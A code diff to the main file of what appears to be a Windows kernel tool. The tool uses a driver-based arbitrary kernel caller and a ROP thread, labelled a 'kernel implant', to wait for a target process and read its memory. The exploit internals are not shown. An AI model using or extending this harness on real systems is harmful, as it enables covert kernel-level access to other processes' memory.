@@ -5,6 +5,8 @@
 #include <include/globals.hpp>
 #include <include/rop_thread/rop_thread.hpp>
 
+#define TARGET_PROCESS_NAME "notepad.exe"
+
 int main()
 {
     // Required in our process starting from winver 24h2 to get
@@ -44,18 +46,26 @@ int main()
     Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller("NtReadFileScatter");
     RopThreadManager RopThread(KernelCaller);
 
-    std::cin.get();
-
     RopThread.SpawnThread();
 
-    const int TargetPid = Utils::GetPidByName("notepad.exe");
+    std::printf("[+] Kernel implant thread spawned\n");
+    std::printf("[+] Awaiting target process\n");
+
+    int TargetPid = 0;
+    while (!TargetPid)
+    {
+        TargetPid = Utils::GetPidByName(TARGET_PROCESS_NAME);
+        Sleep(100);
+    }
+
+    std::printf("[+] Target process pid %d\n", TargetPid);
 
     RopThread.SendTargetProcessPid(TargetPid);
 
-    const std::uint64_t NotepadBase = Utils::GetModuleBaseAddress(TargetPid, "notepad.exe");
+    const std::uint64_t TargetProcessBase = Utils::GetModuleBaseAddress(TargetPid, TARGET_PROCESS_NAME);
 
-    void* ReadBuffer = RopThread.Read<void*>(NotepadBase);
-    printf("read 8 bytes: 0x%p\n", ReadBuffer);
+    void* ReadBuffer = RopThread.Read<void*>(TargetProcessBase);
+    printf("[+] Read 8 bytes from process %s: 0x%p\n", TARGET_PROCESS_NAME, ReadBuffer);
 
     std::cin.get();
 
